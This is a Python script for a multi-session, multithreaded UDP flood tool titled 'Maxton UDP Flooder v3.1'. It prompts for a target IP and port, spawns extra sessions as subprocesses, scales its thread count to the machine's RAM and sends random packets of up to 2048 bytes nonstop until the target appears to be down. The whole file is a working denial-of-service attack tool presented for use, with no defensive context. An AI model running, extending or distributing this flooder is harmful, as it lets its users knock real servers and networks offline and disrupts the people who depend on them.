import socket
import threading
import random
import os
import time
import psutil
import subprocess
import sys

# Clear & Banner
os.system("clear")
print("""
\033[1;32m
███╗   ███╗ █████╗ ██╗  ██╗████████╗ ██████╗ ███╗   ██╗
████╗ ████║██╔══██╗╚██╗██╔╝╚══██╔══╝██╔═══██╗████╗  ██║
██╔████╔██║███████║ ╚███╔╝    ██║   ██║   ██║██╔██╗ ██║
██║╚██╔╝██║██╔══██║ ██╔██╗    ██║   ██║   ██║██║╚██╗██║
██║ ╚═╝ ██║██║  ██║██╔╝ ██╗   ██║   ╚██████╔╝██║ ╚████║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═══╝
   \033[1;31mMaxton UDP Flooder v3.1 (Auto/Manual Thread + Multi Session)
   Created by Robert Maxton | Auto Stop When Target is Down
\033[0m
""")

# Check if it's a sub-process (called by main session launcher)
if len(sys.argv) == 3:
    ip = sys.argv[1]
    port = int(sys.argv[2])
else:
    ip = input("Target IP: ")
    port = int(input("Target Port: "))
    sessions = int(input("How many sessions do you want to launch (e.g. 5): "))
    mode = input("Use Auto Thread Mode based on RAM? (y/n): ").lower()

    # Save mode to global variable for subprocesses
    os.environ["MAXTON_THREAD_MODE"] = mode

    print(f"\n\033[1;34m[+] Launching {sessions} sessions...\033[0m\n")
    for i in range(sessions - 1):  # main one will run below
        subprocess.Popen(["python", sys.argv[0], ip, str(port)], env={**os.environ})
        print(f"\033[1;32m[+] Session {i+1} started.\033[0m")
    print(f"\033[1;32m[+] Session {sessions} (Main session) running now...\n\033[0m")

# Determine thread count
env_mode = os.environ.get("MAXTON_THREAD_MODE", "y")
if env_mode == "n":
    threads = int(input("Enter number of threads manually: "))
else:
    ram = int(psutil.virtual_memory().total / (1024 ** 2))
    if ram < 1000:
        threads = 200
    elif ram < 2000:
        threads = 500
    else:
        threads = 1000
    print(f"\033[1;34m[+] Detected RAM: {ram}MB | Threads per session: {threads}\033[0m\n")

sent = 0
running = True
check_interval = 5  # seconds

# Check if target is alive
def is_alive():
    try:
        check_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        check_sock.settimeout(2)
        check_sock.sendto(b'check', (ip, port))
        return True
    except:
        return False

# Flood Function
def flood():
    global sent, running
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            size = random.randint(512, 2048)
            packet = random._urandom(size)
            sock.sendto(packet, (ip, port))
            sent += 1
            print(f"\033[1;36m[Sent {sent}] => {ip}:{port} | Size: {size} bytes\033[0m")
        except:
            pass

# Start threads
for i in range(threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

# Auto checker
try:
    while running:
        time.sleep(check_interval)
        if not is_alive():
            print("\n\033[1;31m[!] Target seems DOWN. Stopping flood...\033[0m")
            running = False
except KeyboardInterrupt:
    print("\n\033[1;33m[!] Stopped by user.\033[0m")